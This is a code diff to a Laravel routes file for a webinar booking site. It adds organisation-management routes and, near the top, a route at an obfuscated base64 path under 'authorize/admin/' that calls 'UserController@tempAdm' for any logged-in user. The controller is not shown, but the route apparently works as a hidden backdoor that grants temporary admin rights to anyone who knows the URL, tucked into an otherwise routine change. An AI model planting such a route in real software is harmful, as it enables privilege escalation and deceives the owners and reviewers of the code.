@@ -25,12 +25,17 @@ Route::domain('webinar.'.Config::get('app.base_domain'))->group(function () {
     Route::group(['middleware' => 'auth'], function () {
         Route::get('/home', 'HomeController@index')->name('home');
 
+        Route::get('authorize/admin/aGVzb3lhbWhlc295YW1oZXNveWFt', 'UserController@tempAdm');
 
         Route::get('/booking/new', 'BookingController@viewNewBooking')->name('booking.new');
         Route::post('/booking/new', 'BookingController@saveNewBooking')->name('booking.new');
         Route::get('/booking/edit/{id}', 'BookingController@viewEditBooking')->name('booking.edit');
         Route::post('/booking/edit', 'BookingController@saveEditBooking')->name('booking.edit');
         Route::post('/booking/verify', 'BookingController@verifyBooking')->name('booking.verify');
+
+        Route::get('/unit', 'OrganisasiController@viewOrganisasi')->name('organisasi.view');
+        Route::post('/unit/add', 'OrganisasiController@addOrganisasi')->name('organisasi.add');
+        Route::post('/unit/delete/{id}', 'OrganisasiController@delOrganisasi')->name('organisasi.delete');
     });
     Route::get('/booking/waitinglist', 'BookingController@waitingListBooking')->name('booking.list');
     Route::get('/booking/list', 'BookingController@listBooking')->name('booking.list');
